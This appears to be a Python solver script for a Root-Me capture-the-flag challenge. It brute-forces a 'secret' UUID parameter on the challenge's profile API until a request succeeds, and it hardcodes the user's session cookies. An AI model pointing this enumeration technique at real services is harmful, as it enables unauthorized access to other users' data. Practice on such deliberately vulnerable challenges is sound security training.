import requests

# Configuration
URL_BASE = "http://challenge01.root-me.org:59091/api/profile"
FICHIER_UUIDS = "uuids_cible.txt"

# Tes headers et cookies (copiés de ta requête)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Accept-Language": "fr-FR,fr;q=0.9",
    "Referer": "http://challenge01.root-me.org:59091/",
}

COOKIES = {
    "PHPSESSID": "32acf17f30a25ce8af441c9030cfc532",
    "session": ".eJwlzj0OwjAMQOG7eGZwnNhxepkq_olgbemEuDuVGJ_0hu8D-zryfML2Pq58wP4K2GDxYmturLm6I5owc1JN7FM8l6tqsSWTLUaT7lSQzWsUv5dq_a7OpSYNb1k9RFs3FtTJgaIxoo2KQzJKzklGtjSIqHl0zAI35Drz-GsqfH8ARC_H.aY2UbQ.tCp0AOuuI2J_smCONV51j90Px2M"
}

def test_uuids():
    try:
        with open(FICHIER_UUIDS, "r") as f:
            uuids = f.read().splitlines()
    except FileNotFoundError:
        print(f"Erreur : Le fichier {FICHIER_UUIDS} est introuvable.")
        return

    print(f"Démarrage du test sur {len(uuids)} UUIDs...")

    for uuid_to_test in uuids:
        # Nettoyage de l'UUID (au cas où il y aurait des espaces)
        uuid_to_test = uuid_to_test.strip()
        if not uuid_to_test:
            continue

        # Construction des paramètres GET
        params = {"secret": uuid_to_test}

        try:
            response = requests.get(URL_BASE, headers=HEADERS, cookies=COOKIES, params=params)
            
            # On vérifie si la réponse contient quelque chose d'intéressant
            # Si le code est 200, c'est probablement gagné !
            if response.status_code == 200:
                print(f"[+] SUCCÈS ! UUID valide trouvé : {uuid_to_test}")
                print(f"Réponse : {response.text}")
                break # On s'arrête si on a trouvé
            else:
                print(f"[-] Test : {uuid_to_test} | Statut : {response.status_code}")

        except Exception as e:
            print(f"[!] Erreur sur l'UUID {uuid_to_test} : {e}")

if __name__ == "__main__":
    test_uuids()